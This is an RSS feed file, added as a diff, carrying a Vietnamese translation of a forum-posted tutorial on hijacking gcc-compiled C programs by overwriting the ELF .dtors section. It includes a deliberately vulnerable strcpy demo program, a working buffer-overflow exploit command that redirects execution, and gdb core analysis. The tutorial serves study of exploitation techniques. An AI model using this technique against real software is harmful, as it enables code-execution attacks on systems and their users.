@@ -1,0 +1,297 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Overwriting the .dtors section"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/24.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Overwriting the .dtors section"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Overwriting the .dtors section</title>
+				<description><![CDATA[ Overwriting the .dtors section by Juan M. Bello Rivas 
+             Dịch sang tiếng Việt: SeekZero
+-------------------------------------------------------------------------------
+
+
+Giới thiệu
+----------
+
+Bài viết này trình bày một cách ngắn gọn một kỹ thuật dùng để chiếm quyền điều
+khiển và đổi hướng thực thi của một chương trình C được biên dịch bằng gcc.
+Người đọc xem như đã quen thuộc với kỹ thuật tràn bộ đệm cơ bản và định dạng
+ELF.
+
+
+Tổng quan
+---------
+
+gcc cung cấp một số kiểu thuộc tính (attributes) cho hàm, đặc biệt hai trong
+số đó làm chúng ta quan tâm là: cấu tử (constructor) và huỷ tử (destructor).
+Các thuộc tính này phải được lập trình viên mô tả theo cách tương tự như sau:
+
+        static void start(void) __attribute__ ((constructor));
+        static void stop(void) __attribute__ ((destructor));
+
+Hàm với thuộc tính 'constructor' sẽ được thực thi trước hàm main(), trong khi
+các hàm được khai báo với thuộc tính 'destructor' sẽ được thực thi ngay sau
+hàm main().
+
+Khi tạo các file thực thi dạng ELF, đặc điểm này sẽ được thể hiện trong hai
+vùng khác nhau là: .ctors và .dtors. Cả hai vùng sẽ có cách sắp xếp như sau:
+
+    0xffffffff <function address> <another function address> ... 0x00000000
+
+LƯU Ý: Nếu bạn muốn biết tường tận về điều này, bạn nên xem mã nguồn
+gcc-2.95.2/gcc/collect2.c.
+
+Bắt đầu từ đây, có một số điểm cần quan tâm:
+    * .ctors và .dtors sẽ được ánh xạ (map) vào không gian bộ nhớ của tiến
+    trình thực thi và mặc định là vùng ghi được.
+    * Các vùng này không bị xoá khi sử dụng lệnh strip(1) với file thực thi
+    * Chúng ta không quan tâm người viết ra chương trình có tạo các hàm làm
+    cấu tử hoặc huỷ tử hay không vì cả hai vùng này cũng đều tồn tại và được
+    ánh xạ vào bộ nhớ.
+
+
+Khảo sát chi tiết
+-----------------
+
+Chúng ta sẽ minh họa những gì đã đề cập ở trên.
+
+$ cat > yopta.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+
+static void start(void) __attribute__ ((constructor));
+static void stop(void) __attribute__ ((destructor));
+
+int
+main(int argc, char *argv[])
+{
+        printf("start == %p\n", start);
+        printf("stop == %p\n", stop);
+
+        exit(EXIT_SUCCESS);
+}
+
+void
+start(void)
+{
+        printf("hello world!\n");
+}
+
+void
+stop(void)
+{
+        printf("goodbye world!\n");
+}
+
+EOF
+$ gcc -o yopta yopta.c
+$ ./yopta
+hello world!
+start == 0x8048480
+stop == 0x80484a0
+goodbye world!
+$ objdump -h yopta
+                                       .
+                                       .
+                                       .
+ 14 .data         0000000c  08049558  08049558  00000558  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 15 .eh_frame     00000004  08049564  08049564  00000564  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 16 .ctors        0000000c  08049568  08049568  00000568  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 17 .dtors        0000000c  08049574  08049574  00000574  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 18 .got          00000024  08049580  08049580  00000580  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+                                       .
+                                       .
+                                       .
+$ objdump -s -j .dtors yopta
+
+yopta:     file format elf32-i386
+
+Contents of section .dtors:
+ 8049574 ffffffff a0840408 00000000           ............
+
+Ta thấy địa chỉ của hàm stop() được lưu trong .dtors như đã đề cập ở trên. Mục
+đích của chúng ta là khai thác chương trình vì vậy từ đây chúng ta sẽ không
+quan tâm đến .ctors vì nó thực sự không có ích lợi gì cả.
+
+Chúng ta sẽ thử một chương trình bình thường không có các hàm thuộc tính này
+(được khai báo tường minh):
+
+$ cat > bleh.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+static void bleh(void);
+
+int
+main(int argc, char *argv[])
+{
+        static u_char buf[] = "bleh";
+
+        if (argc < 2)
+                exit(EXIT_FAILURE);
+
+        strcpy(buf, argv[1]);
+
+        exit(EXIT_SUCCESS);
+}
+
+void
+bleh(void)
+{
+        printf("goffio!\n");
+}
+EOF
+$ gcc -o bleh bleh.c
+$ ./bleh
+$ objdump -h bleh
+                                       .
+                                       .
+                                       .
+ 17 .dtors        00000008  0804955c  0804955c  0000055c  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+                                       .
+                                       .
+                                       .
+
+Tốt! .dtors vẫn còn đó dù không có hàm huỷ tử nào được khai báo. Hãy xem nội
+dung của nó:
+
+$ objdump -s -j .dtors bleh
+
+bleh:     file format elf32-i386
+
+Contents of section .dtors:
+ 804955c ffffffff 00000000                    ........
+
+Chỉ có các tag bắt đầu và kết thúc, không có địa chỉ hàm nào được mô tả ở đây.
+
+Có thể thấy là hơi kỳ quặc khi ở trên ta khai báo biến "buf" vừa là static lại
+vừa được khởi trị. Bằng cách này chúng ta sẽ làm buf được lưu trong vùng
+.data, rất gần với vùng .dtors ta đang nhắm tới. Nhờ đó chúng ta có thể đạt
+được mục đích dễ dàng bằng cách làm tràn bộ đệm buf. Đây không phải là con
+đường duy nhất để ghi lên vùng .dtors, gần như mọi cách bạn có thể thực hiện
+để ghi lên không gian bộ nhớ của tiến trình đều dùng được (tấn công bằng định
+dạng chuỗi, strcpy trực tiếp bằng cách trở về hàm libc, làm hỏng malloc chunk,
+...). Cách được chọn sử dụng ở đây là một cách đơn giản nhằm để minh hoạ.
+
+Mục tiêu bây giờ là làm thế nào có thể thực thi đoạn mã trong hàm bleh() (sẽ
+không bao giờ được gọi trong điều kiện bình thường) bằng cách tạo một entry
+trong .dtors trỏ đến nó. Để đạt được điều đó chúng ta sẽ không đụng đến tag
+bắt đầu và chỉ ghi đè lên tag kết thúc (0x00000000).
+
+$ objdump --syms bleh | egrep 'text.*bleh'
+080484b0 l     F .text  0000001a              bleh
+
+Có thể thấy hàm bleh() có địa chỉ 0x080484b0. Hãy bắt đầu khai thác lỗ hổng:
+
+$ ./bleh `perl -e 'print "A" x 24; print "\xb0\x84\x04\x08";'`
+goffio!
+Segmentation fault (core dumped)
+
+Thử nghiệm đã thành công như chúng ta mong đợi, nhưng có lẽ tốt hơn là nên xem
+xét kỹ lưỡng core do tiến trình tạo ra và xem những gì đã bị thay đổi.
+
+$ gdb bleh core
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+Core was generated by `./bleh AAAAAAAAAAAAAAAAAAAAAAAA°
+                                                      '.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/libc.so.6...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x40013ed8 in ?? ()
+(gdb) bt
+#0  0x40013ed8 in ?? ()
+#1  0x8048521 in _fini ()
+#2  0x4003c25a in exit (status=0) at exit.c:57
+#3  0x80484a3 in main ()
+#4  0x400339cb in __libc_start_main (main=0x8048460 <main>, argc=2,
+argv=0xbffff8a4, init=0x80482e0 <_init>, fini=0x804850c <_fini>,
+rtld_fini=0x4000ae60 <_dl_fini>, stack_end=0xbffff8
+9c) at ../sysdeps/generic/libc-start.c:92
+(gdb) maintenance info sections
+Exec file:
+    `/home/rwx/tmp/bleh', file type elf32-i386.
+                                       .
+                                       .
+                                       .
+    0x0804953c->0x08049550 at 0x0000053c: .data ALLOC LOAD DATA HAS_CONTENTS
+    0x08049550->0x08049554 at 0x00000550: .eh_frame ALLOC LOAD DATA HAS_CONTENTS
+    0x08049554->0x0804955c at 0x00000554: .ctors ALLOC LOAD DATA HAS_CONTENTS
+    0x0804955c->0x08049564 at 0x0000055c: .dtors ALLOC LOAD DATA HAS_CONTENTS
+    0x08049564->0x0804958c at 0x00000564: .got ALLOC LOAD DATA HAS_CONTENTS
+                                       .
+                                       .
+                                       .
+
+Chúng ta sẽ xem xét những gì đã bị ghi đè
+
+(gdb) x/x 0x08049550
+0x8049550 <force_to_data>:      0x41414141
+
+Đây là nội dung của vùng .eh_frame (gcc sử dụng để lưu các con trỏ xử lý biệt
+lệ (exception) cho các ngôn ngữ có hỗ trợ chúng)
+
+(gdb) x/x 0x08049554
+0x8049554 <__CTOR_LIST__>:      0x41414141
+(gdb) x/8x 0x0804955c
+0x804955c <__DTOR_LIST__>:      0x41414141      0x080484b0      0x08049500
+ 0x40013ed0
+0x804956c <_GLOBAL_OFFSET_TABLE_+8>:    0x4000a960      0x400fb550      0x08048
+336      0x400338cc
+(gdb)
+
+Như đã thấy, chúng ta không quan tâm đặt tag bắt đầu 0xfffffff ở vị trí tương
+ứng của nó và điều đó hoàn toàn không cần thiết, chỉ cần đặt địa chỉ của
+bleh() vào đúng chỗ, chúng ta sẽ làm đoạn mã được thực thi. Cũng lưu ý rằng
+tiến trình bị segfault ngay sau _fini(), điều này rõ ràng là do nó tiếp tục
+tìm đến tag kết thúc (0x00000000) - lúc này đã không còn tồn tại - và nhảy đến
+các địa chỉ kế tiếp ngay sau địa chỉ của bleh() (các địa chỉ này được xác định
+trong bảng GOT - Global Offset Table).
+
+
+Kết luận
+--------
+
+Bài viết đã trình bày một cách khác để thực thi các đoạn shellcode được chèn
+vào chương trình. Kỹ thuật này có một số ưu điểm:
+
+    * Nếu file thực thi có thể đọc được, sẽ rất dễ để xác định chính xác vị
+    trí chúng ta muốn ghi vào và trỏ đến đoạn shellcode, chỉ cần xem file
+    thực thi dạng ELF và xác định vị trí của vùng .dtors là đủ. Trong trường
+    hợp này tính tin cậy (khả năng thành công) của trình khai thác lỗi tăng
+    lên đáng kể.
+    * Đơn giản hơn so với các kỹ thuật khác như ghi đè một entry trong bảng
+    GOT.
+
+Và những nhược điểm:
+
+    * Chương trình bị lỗi phải được biên dịch và liên kết bằng GNU gcc
+    * Trong một số trường hợp có thể gặp khó khăn để tìm một nơi để chứa
+    shellcode cho đến khi chương trình thoát ra.
+
+        Have fun! :)
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/158.hva#549</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/158.hva#549</link>
+				<pubDate><![CDATA[Tue, 20 Jun 2006 05:01:45]]> GMT</pubDate>
+				<author><![CDATA[ Mulan]]></author>
+			</item>
+	</channel>
+</rss>
